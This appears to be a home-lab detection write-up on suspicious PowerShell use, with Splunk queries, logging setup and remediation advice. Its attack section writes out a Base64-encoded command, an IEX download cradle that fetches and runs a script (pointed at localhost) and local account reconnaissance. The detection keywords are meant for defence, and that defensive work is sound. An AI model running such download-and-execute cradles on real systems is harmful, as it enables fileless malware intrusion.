# Detection: Suspicious PowerShell Execution

## Overview

| Field | Detail |
|---|---|
| **MITRE Tactic** | Execution |
| **MITRE Technique** | T1059.001 — PowerShell / T1027 — Obfuscated Files |
| **Event ID** | 4688 — Process Creation, PowerShell Operational Log |
| **Severity** | High |
| **Tool Used** | Windows PowerShell |
| **Source** | W11SOC — local execution |
| **Target** | W11SOC (192.168.250.129) |

---

## What Is This Attack?

PowerShell is a legitimate Windows tool abused by attackers because it is built into every Windows system, signed by Microsoft, and trusted by default. Two techniques were simulated:

1. **Base64 encoded command execution** — obfuscates malicious commands from security tools
2. **IEX download cradle** — downloads and executes scripts in memory without touching disk (fileless malware)

---

## Attack Commands

```powershell
# Technique 1: Encoded command
$command = "whoami"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
powershell -EncodedCommand $encoded

# Technique 2: Download cradle (fileless)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1/fake')"

# Technique 3: Reconnaissance
powershell -c "Get-LocalUser"
powershell -c "Get-LocalGroupMember Administrators"
powershell -c "Invoke-Expression 'net localgroup administrators'"
```

---

## Enable Logging First

```powershell
# Enable script block logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f

# Enable process creation command line logging
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
```

---

## Splunk Detection Query

```spl
index=windows EventCode=4688
| search CommandLine="*EncodedCommand*" OR CommandLine="*IEX*" OR CommandLine="*DownloadString*" OR CommandLine="*WebClient*"
| table _time, Account_Name, CommandLine
| sort - _time
```

```spl
index=windows source="WinEventLog:Microsoft-Windows-PowerShell/Operational"
| table _time, Message
| sort - _time
```

---

## Evidence

 ![Splunk screenshot showing suspicious PowerShell EventCode 4688 detections](/screenshots/powershell-execution.png)

---

## Remediation

- Enable PowerShell Script Block Logging and Module Logging
- Implement PowerShell Constrained Language Mode
- Alert on `-EncodedCommand`, `IEX`, `DownloadString`, `WebClient` in process creation logs
- Block PowerShell for standard users via Group Policy
- Implement application whitelisting (WDAC or AppLocker)
